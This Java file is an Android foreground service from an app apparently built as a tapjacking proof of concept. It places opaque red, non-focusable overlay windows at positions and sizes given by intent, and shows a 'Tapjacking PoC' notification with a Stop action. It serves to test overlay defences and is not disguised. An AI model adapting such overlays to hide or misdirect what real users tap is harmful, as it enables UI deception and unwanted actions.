package com.tapjacking;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.ColorDrawable;
import android.os.IBinder;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;

import androidx.core.app.NotificationCompat;

import java.util.ArrayList;
import java.util.List;

public class PartialOverlayService extends Service {

    private static final String CHANNEL_ID = "overlay_channel";
    private static final int NOTIFICATION_ID = 1;

    private WindowManager windowManager;
    private final List<View> overlayViews = new ArrayList<>();

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        startForegroundWithNotification();
    }

    private void startForegroundWithNotification() {
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "Overlay Service", NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(channel);

        Intent stopIntent = new Intent(this, StopOverlayReceiver.class);
        PendingIntent stopPi = PendingIntent.getBroadcast(
                this, 0, stopIntent, PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Tapjacking PoC")
                .setContentText("Overlay active")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .addAction(0, "Stop", stopPi)
                .setOngoing(true)
                .build();

        startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        int x = intent.getIntExtra("x", 0);
        int y = intent.getIntExtra("y", 0);
        int width = intent.getIntExtra("width", 100);
        int height = intent.getIntExtra("height", 100);

        FrameLayout overlayLayout = new FrameLayout(this);
        overlayLayout.setBackground(new ColorDrawable(Color.RED));

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                width, height,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.TOP | Gravity.START;
        params.x = x;
        params.y = y;

        windowManager.addView(overlayLayout, params);
        overlayViews.add(overlayLayout);

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        for (View v : overlayViews) {
            windowManager.removeView(v);
        }
        overlayViews.clear();
    }
}
